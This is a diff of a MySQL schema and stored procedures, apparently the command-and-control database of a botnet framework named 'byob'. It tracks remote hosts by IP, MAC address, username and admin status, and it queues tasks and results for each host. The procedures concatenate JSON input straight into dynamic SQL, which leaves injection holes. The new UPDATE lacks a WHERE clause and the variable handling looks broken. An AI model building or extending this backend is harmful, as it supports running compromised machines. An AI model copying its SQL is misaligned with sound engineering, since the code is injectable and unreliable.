@@ -1,11 +1,12 @@
 CREATE DATABASE IF NOT exists `byob`;
 use `byob`;
-CREATE TABLE IF NOT exists `tbl_clients` (
+CREATE TABLE IF NOT exists `tbl_sessions` (
     `id` serial,
     `uid` varchar(32) NOT NULL,
     `online` boolean DEFAULT 0,
-    `joined` TIMESTAMP,
-    `last_online` TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+    `joined` DATETIME DEFAULT NULL,
+    `last_online` DATETIME DEFAULT NULL,
+    `sessions` tinyint(3) DEFAULT 1,
     `public_ip` varchar(42) DEFAULT NULL,
     `mac_address` varchar(17) DEFAULT NULL,
     `local_ip` varchar(42) DEFAULT NULL,
@@ -16,17 +17,17 @@ CREATE TABLE IF NOT exists `tbl_clients` (
     `architecture` text DEFAULT NULL,
     PRIMARY KEY (`uid`(32)))
     DEFAULT CHARSET=latin1;
-DROP PROCEDURE IF exists `sp_handle_client`;
-DELIMITER $$
-CREATE DEFINER=`root`@`localhost` PROCEDURE sp_handle_client(IN `info` text, OUT `client` JSON)
+DROP PROCEDURE IF exists `sp_handle_session`;
+CREATE DEFINER=`root`@`localhost` PROCEDURE sp_handle_session(IN `input` text, OUT `session` JSON)
 BEGIN
-    DECLARE tbl text;
-    DECLARE row text;
-    SET client=JSON_UNQUOTE(info);
-    SET client=JSON_MERGE(client, JSON_OBJECT("uid", MD5(CONCAT(client->>'$.public_ip', client->>'$.mac_address')), "online", 1, "joined", NOW()));
-    INSERT INTO `tbl_clients`
+    DECLARE `@sql` text;
+    DECLARE `uid` varchar(32);
+    SET session=JSON_UNQUOTE(input);
+    SET session=JSON_MERGE(session, JSON_OBJECT("uid", MD5(CONCAT(session->>'$.public_ip', session->>'$.mac_address'))));
+    INSERT INTO `tbl_sessions`
     (
          online,
+         sessions,
          joined,
          last_online,
          uid,
@@ -41,32 +42,36 @@ BEGIN
     )
     VALUES
     (
-         client->>'$.online',
-         client->>'$.joined',
-         client->>'$.last_online',
-         client->>'$.uid',
-         client->>'$.public_ip',
-         client->>'$.local_ip',
-         client->>'$.mac_address',
-         client->>'$.username',
-         client->>'$.administrator',
-         client->>'$.device',
-         client->>'$.platform',
-         client->>'$.architecture'
-    );
-    SET tbl=CONCAT("CREATE TABLE IF NOT EXISTS `", client->>'$.uid', "` (`id` serial, `uid` varchar(32), `task` text DEFAULT NULL, `result` text DEFAULT NULL, `issued` TIMESTAMP, `completed` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`uid`(32))) DEFAULT CHARSET=latin1;");
-    PREPARE stmt FROM tbl;
-    EXECUTE tbl;
-END$$
+         1,
+         1,
+         NOW(),
+         NOW(),
+         session->>'$.uid',
+         session->>'$.public_ip',
+         session->>'$.local_ip',
+         session->>'$.mac_address',
+         session->>'$.username',
+         session->>'$.administrator',
+         session->>'$.device',
+         session->>'$.platform',
+         session->>'$.architecture'
+    )
+    ON DUPLICATE KEY UPDATE online=1, last_online=NOW(), sessions=sessions+1;
+    SET @sql=CONCAT("CREATE TABLE IF NOT EXISTS `", session->>'$.uid',"` (`id` serial,`uid` varchar(32), `task` text DEFAULT NULL, `result` text DEFAULT NULL, `issued` DATETIME DEFAULT NULL, `completed` DATETIME DEFAULT NULL, PRIMARY KEY (`uid`(32))) DEFAULT CHARSET=latin1;");
+    PREPARE `stmt` FROM @sql;
+    EXECUTE `stmt`;
+END;
 DROP PROCEDURE IF EXISTS `sp_handle_task`;
-DELIMITER $$
-CREATE DEFINER=`root`@`localhost` PROCEDURE sp_handle_task(IN `task` text, OUT `@row` text)
+CREATE DEFINER=`root`@`localhost` PROCEDURE sp_handle_task(IN `input` text, OUT `task` JSON)
 BEGIN
-    DECLARE `taskid` varchar(32);
-    SET task=JSON_UNQUOTE(task);
-    SET taskid=MD5(CONCAT(task->>'$.client',task->>'$.task',UNIX_TIMESTAMP()));
-    SET @row=CONCAT("INSERT INTO ", task->>'$.client'," (uid, task, issued) VALUES ('", taskid, "','", task->>'$.task', "','", task->>'$.issued', "','", NOW(), "') ON DUPLICATE KEY UPDATE ", task->>'$.client', " SET result='", task->>'$.result', "', completed=NOW() WHERE uid='", task->>'$.taskid', "';");
-    PREPARE stmt FROM @row;
-    EXECUTE stmt;
-END$$
-DELIMITER ;
+    DECLARE `@sql` text;
+    SET input=JSON_UNQUOTE(input);
+    IF (input->>'$.uid') IS NULL THEN SET task=JSON_SET(input, '$.issued', NOW(), '$.uid', MD5(CONCAT(input->>'$.session', input->>'$.task', NOW())));
+    ELSE SET task=JSON_SET(input, '$.completed', NOW());
+    END IF;
+    IF (input->>'$.result') IS NULL THEN SET @sql=CONCAT("INSERT INTO ", task->>'$.session'," (uid, task, issued) VALUES ('", task->>'$.uid', "','", task->>'$.task', "','", task->>'$.issued', "');");
+    ELSE SET @sql=CONCAT("UPDATE ", task->>'$.session', " SET result='", task->>'$.result', "', completed='", NOW(), "';");
+    END IF;
+    PREPARE `stmt` FROM @sql;
+    EXECUTE `stmt`;
+END;
